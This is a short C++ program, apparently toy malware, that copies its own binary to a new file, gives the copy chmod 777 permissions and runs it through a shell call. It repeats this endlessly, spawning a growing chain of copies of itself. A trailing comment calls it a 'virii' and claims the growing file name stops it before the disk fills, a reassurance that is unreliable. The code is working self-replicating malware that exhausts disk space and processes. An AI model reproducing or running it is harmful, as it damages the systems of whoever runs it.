#include <chrono>
#include <sstream>
#include <fstream>
#include <iostream>

int main(int argc, char *argv[]) {

    auto now = std::chrono::high_resolution_clock::now();

    std::string root_name = argv[0];
    std::ifstream root(root_name);

    std::chrono::duration<double, std::milli> diff = std::chrono::high_resolution_clock::now() - now;
    std::string id = std::to_string(diff.count());

    std::string leaf_name(root_name.append(id).c_str());

    std::ofstream leaf(leaf_name);
    leaf << root.rdbuf();
    leaf.close();

    std::cout << "Welcome to World! => " << leaf_name << std::endl;

    std::stringstream cmd;
    cmd << "chmod 777 " << leaf_name << " && " << leaf_name;

    return std::system(cmd.str().c_str());
}

// THE NAME OF THE VIRII IS INCREASING ON SIZE, THIS ENSURE THAT THE CYCLE CRASH BEFORE INFECT ALL DISK OK?